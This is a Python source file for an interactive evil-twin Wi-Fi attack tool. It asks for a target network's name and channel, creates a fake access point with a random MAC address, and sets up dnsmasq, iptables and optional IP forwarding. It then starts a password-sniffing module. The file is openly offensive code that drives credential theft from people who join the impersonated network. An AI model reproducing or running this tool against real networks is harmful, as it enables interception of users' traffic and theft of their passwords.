import sys
import os
import random
import time
from faker import Faker
from moduless import methods
from moduless import passsniff


def configs(iface):
    pwd = os.getcwd()

    os.system("xterm -e python3 moduless/dump.py {0}".format(iface))
    essid = input(u"\u001b[33;1m[^] (Target essid)-> ")
    if essid == "":
        print("E...r")
        sys.exit()
    else:
        print(u"\u001b[32;1m[*] Set {0} Target essid!".format(essid))

    bssid = Faker().mac_address

    channel = input(u"\u001b[33;1m[^] (Target channel)-> ")
    if channel == "":
        print("E...r")
        sys.exit()
    else:
        print(u"\u001b[32;1m[*] Set {0} Target channel!".format(channel))

    ethstat = input(u"\u001b[33;1m[^] (interface for forward packets)-> ")
    if ethstat == "" or ethstat == " ":
        eth = None
    else:
        eth = ethstat

    ifacemon = "at0"

    result = {
        "essid" : essid,
        "bssid" : bssid,
        "channel" : channel,
        "iface" : iface,
        "eth" : eth,
        "ifacemon" : ifacemon
    }

    return result


def start(iface):
    config = configs(iface)
    print("[*] Create evil twin")
    methods.createfake(config["iface"], config["essid"], config["bssid"], config["channel"])
    print("[*] Configure dnsmasq")
    methods.dnsmasqconfig()
    print("[*] Starting dnsmasq")
    methods.dnsmasqstart()
    print("[*] Set interfaces")
    methods.at0up(config["ifacemon"])
    methods.iptables(config["eth"], config["ifacemon"])
    ipforward = input("[^] IP forward on/off: ")
    if ipforward == "on" or ipforward == "On" or ipforward == "ON":
        print(u"\u001b[32;1m[*] IP forward activate")
        methods.ipforward_on()
    elif ipforward == "off" or ipforward == "Off" or ipforward == "OFF":
        print("[*] IP forward unactivate")
        methods.ipforward_off()

    passsniff.start()
